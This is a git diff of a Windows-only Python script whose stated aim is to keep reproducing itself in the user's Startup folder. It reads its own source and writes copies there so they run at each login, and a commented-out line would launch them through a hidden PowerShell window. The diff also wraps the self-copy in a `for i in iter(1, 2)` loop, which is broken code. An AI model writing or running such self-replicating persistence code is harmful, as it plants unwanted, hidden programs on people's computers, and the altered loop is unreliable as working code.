@@ -12,7 +12,6 @@ Aim keep reproducing itself in the window startup folder. only work for windows
 '''
 import os
 import random
-import numpy as np
 import platform
 # check windows 10 or below
 assert 'windows' in platform.system(), "This prorgam only work on windows"
@@ -32,8 +31,9 @@ with open(__file__, "r") as f:
     startupdir = startdir+username+addlocation+"\\"
     name = f"{startupdir}{name}"
     print(name)
-    with open(name, "w+") as g:
-        g.writelines(selfs)
-        #os.system(f"start /min powershell -windowStyle Hidden -noExit -command \"{name}\"")
+    for i in iter(1, 2):
+        with open(name, "w+") as g:
+            g.writelines(selfs)
+            #os.system(f"start /min powershell -windowStyle Hidden -noExit -command \"{name}\"")
             
 
